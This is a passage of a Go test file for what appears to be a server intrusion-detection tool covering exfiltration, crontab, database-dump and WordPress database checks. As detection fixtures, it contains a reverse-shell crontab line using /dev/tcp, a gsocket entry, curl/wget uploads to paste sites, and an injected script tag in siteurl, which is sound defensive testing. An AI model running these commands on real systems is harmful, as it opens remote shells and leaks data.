				return nil, os.ErrPermission
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckDatabaseDumps(context.Background(), nil, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings when cmdline unreadable, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// exfiltration.go -- CheckOutboundPasteSites uncovered branches
// ---------------------------------------------------------------------------

func TestCheckOutboundPasteSites_DetectsConnection(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/proc/[0-9]*/cmdline" {
				return []string{"/proc/2222/cmdline"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/2222/status":
				return []byte("Name:\tcurl\nUid:\t1000\t1000\t1000\t1000\n"), nil
			case "/proc/2222/cmdline":
				return []byte("curl\x00https://pastebin.com/raw/abc123\x00"), nil
			case "/etc/passwd":
				return []byte("eve:x:1000:1000::/home/eve:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckOutboundPasteSites(context.Background(), nil, nil)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for paste site, got %d", len(findings))
	}
	if findings[0].Check != "exfiltration_paste_site" {
		t.Errorf("unexpected check: %s", findings[0].Check)
	}
}

func TestCheckOutboundPasteSites_RootSkipped(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/proc/[0-9]*/cmdline" {
				return []string{"/proc/3333/cmdline"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/3333/status":
				return []byte("Name:\tcurl\nUid:\t0\t0\t0\t0\n"), nil
			case "/proc/3333/cmdline":
				return []byte("curl\x00https://transfer.sh/abc\x00"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckOutboundPasteSites(context.Background(), nil, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for root, got %d", len(findings))
	}
}

func TestCheckOutboundPasteSites_MultipleSites(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/proc/[0-9]*/cmdline" {
				return []string{"/proc/4444/cmdline", "/proc/5555/cmdline"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/4444/status":
				return []byte("Name:\twget\nUid:\t1000\t1000\t1000\t1000\n"), nil
			case "/proc/4444/cmdline":
				return []byte("wget\x00https://file.io/upload\x00"), nil
			case "/proc/5555/status":
				return []byte("Name:\tcurl\nUid:\t1001\t1001\t1001\t1001\n"), nil
			case "/proc/5555/cmdline":
				return []byte("curl\x00https://0x0.st/data\x00"), nil
			case "/etc/passwd":
				return []byte("alice:x:1000:1000::/home/alice:/bin/bash\nbob:x:1001:1001::/home/bob:/bin/bash\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckOutboundPasteSites(context.Background(), nil, nil)
	if len(findings) != 2 {
		t.Fatalf("expected 2 findings, got %d", len(findings))
	}
}

func TestCheckOutboundPasteSites_NoUIDLine(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/proc/[0-9]*/cmdline" {
				return []string{"/proc/6666/cmdline"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch name {
			case "/proc/6666/status":
				return []byte("Name:\tcurl\n"), nil
			case "/proc/6666/cmdline":
				return []byte("curl\x00https://pastebin.com/raw/xyz\x00"), nil
			case "/etc/passwd":
				return []byte(""), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckOutboundPasteSites(context.Background(), nil, nil)
	_ = findings
}

// ---------------------------------------------------------------------------
// crontabs.go -- CheckCrontabs uncovered branches
// ---------------------------------------------------------------------------

func TestCheckCrontabs_RootCrontabModified(t *testing.T) {
	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/var/spool/cron/*" {
				return []string{"/var/spool/cron/root"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			if name == "/var/spool/cron/root" {
				return []byte("* * * * * /usr/bin/backup.sh\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	_ = CheckCrontabs(context.Background(), nil, store)

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/var/spool/cron/*" {
				return []string{"/var/spool/cron/root"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			if name == "/var/spool/cron/root" {
				return []byte("* * * * * /usr/bin/malware.sh\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckCrontabs(context.Background(), nil, store)
	found := false
	for _, f := range findings {
		if f.Check == "crontab_change" && strings.Contains(f.Message, "Root crontab modified") {
			found = true
		}
	}
	if !found {
		t.Error("expected crontab_change finding for root crontab modification")
	}
}

func TestCheckCrontabs_CronDFileModified(t *testing.T) {
	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/var/spool/cron/*" {
				return nil, nil
			}
			if pattern == "/etc/cron.d/*" {
				return []string{"/etc/cron.d/myjob"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			if name == "/etc/cron.d/myjob" {
				return []byte("0 * * * * root /usr/bin/cleanup\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	_ = CheckCrontabs(context.Background(), nil, store)

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/var/spool/cron/*" {
				return nil, nil
			}
			if pattern == "/etc/cron.d/*" {
				return []string{"/etc/cron.d/myjob"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			if name == "/etc/cron.d/myjob" {
				return []byte("* * * * * root /tmp/exploit.sh\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckCrontabs(context.Background(), nil, store)
	found := false
	for _, f := range findings {
		if f.Check == "crond_change" {
			found = true
		}
	}
	if !found {
		t.Error("expected crond_change finding for cron.d file modification")
	}
}

func TestCheckCrontabs_MultipleSuspiciousPatterns(t *testing.T) {
	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	content := "* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n" +
		"0 * * * * gsocket --help\n"
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/var/spool/cron/*" {
				return []string{"/var/spool/cron/alice"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			if name == "/var/spool/cron/alice" {
				return []byte(content), nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CheckCrontabs(context.Background(), nil, store)
	if len(findings) < 3 {
		t.Fatalf("expected at least 3 suspicious pattern findings, got %d", len(findings))
	}
}

func TestCheckCrontabs_ReadError(t *testing.T) {
	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/var/spool/cron/*" {
				return []string{"/var/spool/cron/alice"}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) { return nil, os.ErrPermission },
	})
	findings := CheckCrontabs(context.Background(), nil, store)
	_ = findings
}

// ---------------------------------------------------------------------------
// dbscan.go -- CheckDatabaseContent uncovered branches
// ---------------------------------------------------------------------------

func TestCheckDatabaseContent_FullFlow(t *testing.T) {
	wpCfg := "<?php\ndefine( 'DB_NAME', 'wp_alice' );\ndefine( 'DB_USER', 'alice_wp' );\ndefine( 'DB_PASSWORD', 'secret123' );\ndefine( 'DB_HOST', 'localhost' );\n$table_prefix = 'wp_';\n"
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/home/*/public_html/wp-config.php" {
				return []string{"/home/alice/public_html/wp-config.php"}, nil
			}
			return nil, nil
		},
		open: func(name string) (*os.File, error) {
			if name == "/home/alice/public_html/wp-config.php" {
				tmp, _ := os.CreateTemp("", "wpconfig")
				_, _ = tmp.Write([]byte(wpCfg))
				_, _ = tmp.Seek(0, 0)
				return tmp, nil
			}
			return nil, os.ErrNotExist
		},
	})
	queryCount := 0
	withMockCmd(t, &mockCmd{
		runWithEnv: func(name string, args []string, extraEnv ...string) ([]byte, error) {
			queryCount++
			for i, a := range args {
				if a == "-e" && i+1 < len(args) {
					q := args[i+1]
					if strings.Contains(q, "option_name") && strings.Contains(q, "siteurl") {
						return []byte("siteurl\thttps://alice.com\nhome\thttps://alice.com\n"), nil
					}
					if strings.Contains(q, "COUNT(*)") {
						return []byte("0\n"), nil
					}
				}
			}
			return nil, nil
		},
	})
	findings := CheckDatabaseContent(context.Background(), nil, nil)
	_ = findings
	if queryCount == 0 {
		t.Error("expected MySQL queries to be executed")
	}
}

func TestCheckDatabaseContent_EmptyDBNameSkipped(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/home/*/public_html/wp-config.php" {
				return []string{"/home/alice/public_html/wp-config.php"}, nil
			}
			return nil, nil
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, "wp-config.php") {
				tmp, _ := os.CreateTemp("", "wpconfig")
				_, _ = tmp.Write([]byte("<?php\n// No DB_NAME defined\n"))
				_, _ = tmp.Seek(0, 0)
				return tmp, nil
			}
			return nil, os.ErrNotExist
		},
	})
	withMockCmd(t, &mockCmd{})
	findings := CheckDatabaseContent(context.Background(), nil, nil)
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for empty DB name, got %d", len(findings))
	}
}

func TestCheckDatabaseContent_SiteurlHijack(t *testing.T) {
	wpCfg := "<?php\ndefine( 'DB_NAME', 'wp_bob' );\ndefine( 'DB_USER', 'bob_wp' );\ndefine( 'DB_PASSWORD', 'pass' );\n$table_prefix = 'wp_';\n"
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/home/*/public_html/wp-config.php" {
				return []string{"/home/bob/public_html/wp-config.php"}, nil
			}
			return nil, nil
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, "wp-config.php") {
				tmp, _ := os.CreateTemp("", "wpconfig")
				_, _ = tmp.Write([]byte(wpCfg))
				_, _ = tmp.Seek(0, 0)
				return tmp, nil
			}
			return nil, os.ErrNotExist
		},
	})
	withMockCmd(t, &mockCmd{
		runWithEnv: func(name string, args []string, extraEnv ...string) ([]byte, error) {
			for i, a := range args {
				if a == "-e" && i+1 < len(args) {
					q := args[i+1]
					if strings.Contains(q, "siteurl") && strings.Contains(q, "home") && strings.Contains(q, "admin_email") {
						return []byte("siteurl\t<script src='evil.js'></script>\nhome\thttps://bob.com\n"), nil
					}
				}
			}
			return nil, nil
		},
	})
	findings := CheckDatabaseContent(context.Background(), nil, nil)
	found := false
	for _, f := range findings {
		if f.Check == "db_siteurl_hijack" {
			found = true
		}
	}
	if !found {
		t.Error("expected db_siteurl_hijack finding")
	}
}

// ---------------------------------------------------------------------------
// dbscan.go -- CleanDatabaseSpam uncovered branches
// ---------------------------------------------------------------------------

func TestCleanDatabaseSpam_CleansPatterns(t *testing.T) {
	wpCfg := "<?php\ndefine( 'DB_NAME', 'wp_alice' );\ndefine( 'DB_USER', 'alice' );\ndefine( 'DB_PASSWORD', 'pass' );\n$table_prefix = 'wp_';\n"
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, "wp-config.php") {
				return []string{"/home/alice/public_html/wp-config.php"}, nil
			}
			return nil, nil
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, "wp-config.php") {
				tmp, _ := os.CreateTemp("", "wpconfig")
				_, _ = tmp.Write([]byte(wpCfg))
				_, _ = tmp.Seek(0, 0)
				return tmp, nil
			}
			return nil, os.ErrNotExist
		},
	})
	withMockCmd(t, &mockCmd{
		runWithEnv: func(name string, args []string, extraEnv ...string) ([]byte, error) {
			for i, a := range args {
				if a == "-e" && i+1 < len(args) {
					q := args[i+1]
					if strings.Contains(q, "COUNT(*)") && strings.Contains(q, "<script>") {
						return []byte("5\n"), nil
					}
					if strings.Contains(q, "UPDATE") {
						return nil, nil
					}
					if strings.Contains(q, "COUNT(*)") {
						return []byte("0\n"), nil
					}
				}
			}
			return nil, nil
		},
	})
	findings := CleanDatabaseSpam("alice")
	found := false
	for _, f := range findings {
		if f.Check == "db_spam_cleaned" {
			found = true
		}
	}
	if !found {
		t.Error("expected db_spam_cleaned finding")
	}
}

func TestCleanDatabaseSpam_SpamDomainsFound(t *testing.T) {
	wpCfg := "<?php\ndefine( 'DB_NAME', 'wp_bob' );\ndefine( 'DB_USER', 'bob' );\ndefine( 'DB_PASSWORD', 'pass' );\n$table_prefix = 'wp_';\n"
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, "wp-config.php") {
				return []string{"/home/bob/public_html/wp-config.php"}, nil
			}
			return nil, nil
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, "wp-config.php") {
				tmp, _ := os.CreateTemp("", "wpconfig")
				_, _ = tmp.Write([]byte(wpCfg))
				_, _ = tmp.Seek(0, 0)
				return tmp, nil
			}
			return nil, os.ErrNotExist
		},
	})
	withMockCmd(t, &mockCmd{
		runWithEnv: func(name string, args []string, extraEnv ...string) ([]byte, error) {
			for i, a := range args {
				if a == "-e" && i+1 < len(args) {
					q := args[i+1]
					// CleanDatabaseSpam runs SELECT ID, post_content FROM ...posts WHERE ... LIKE '%viagra%'
					if strings.Contains(q, "SELECT ID, post_content") && strings.Contains(q, "viagra") {
						return []byte("1\tbuy viagra now at cheap prices\n2\tbest viagra deals online\n3\tviagra discount\n"), nil
					}
					// COUNT(*) queries for other spam patterns return 0
					return []byte("0\n"), nil
				}
			}
			return nil, nil
		},
	})
	findings := CleanDatabaseSpam("bob")
	found := false
	for _, f := range findings {
		if f.Check == "db_spam_found" && strings.Contains(f.Message, "viagra") {
			found = true
		}
	}
	if !found {
		t.Error("expected db_spam_found finding for viagra keyword")
	}
}

func TestCleanDatabaseSpam_EmptyDBName(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if strings.Contains(pattern, "wp-config.php") {
				return []string{"/home/x/public_html/wp-config.php"}, nil
			}
			return nil, nil
		},
		open: func(name string) (*os.File, error) {
			if strings.HasSuffix(name, "wp-config.php") {
				tmp, _ := os.CreateTemp("", "wpconfig")
				_, _ = tmp.Write([]byte("<?php\n"))
				_, _ = tmp.Seek(0, 0)
				return tmp, nil
			}
			return nil, os.ErrNotExist
		},
	})
	findings := CleanDatabaseSpam("x")
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for empty DB name, got %d", len(findings))
	}
}

func TestTruncate_ShortString(t *testing.T) {
	result := truncate("hello", 100)
	if result != "hello" {
		t.Errorf("expected 'hello', got %q", result)
	}
}

func TestTruncate_LongString(t *testing.T) {
	long := strings.Repeat("a", 600)
	result := truncate(long, 500)
	if len(result) != 503 {
		t.Errorf("expected length 503, got %d", len(result))
	}
	if !strings.HasSuffix(result, "...") {
		t.Error("expected '...' suffix")
	}
}

// ---------------------------------------------------------------------------
// Helper types for tests above
// ---------------------------------------------------------------------------

type fakeBlocker struct {
	blocked map[string]bool
}

func (f *fakeBlocker) BlockIP(ip string, reason string, timeout time.Duration) error {
	f.blocked[ip] = true
	return nil
}
func (f *fakeBlocker) UnblockIP(ip string) error { delete(f.blocked, ip); return nil }
func (f *fakeBlocker) IsBlocked(ip string) bool  { return f.blocked[ip] }

type fakeSubnetBlocker struct {
	fakeBlocker
	subnets map[string]bool
}

func (f *fakeSubnetBlocker) BlockSubnet(cidr string, reason string, timeout time.Duration) error {
	f.subnets[cidr] = true
	return nil
}

type worldWritableInfo struct {
	name string
	size int64
}

func (w *worldWritableInfo) Name() string       { return w.name }
func (w *worldWritableInfo) Size() int64        { return w.size }
func (w *worldWritableInfo) Mode() os.FileMode  { return 0666 }
func (w *worldWritableInfo) ModTime() time.Time { return time.Now() }
func (w *worldWritableInfo) IsDir() bool        { return false }
func (w *worldWritableInfo) Sys() interface{}   { return nil }

type dirEntryWithInfo struct {
	name  string
	isDir bool
	info  os.FileInfo
}

func (d *dirEntryWithInfo) Name() string               { return d.name }
func (d *dirEntryWithInfo) IsDir() bool                { return d.isDir }
func (d *dirEntryWithInfo) Type() os.FileMode          { return 0 }
func (d *dirEntryWithInfo) Info() (os.FileInfo, error) { return d.info, nil }
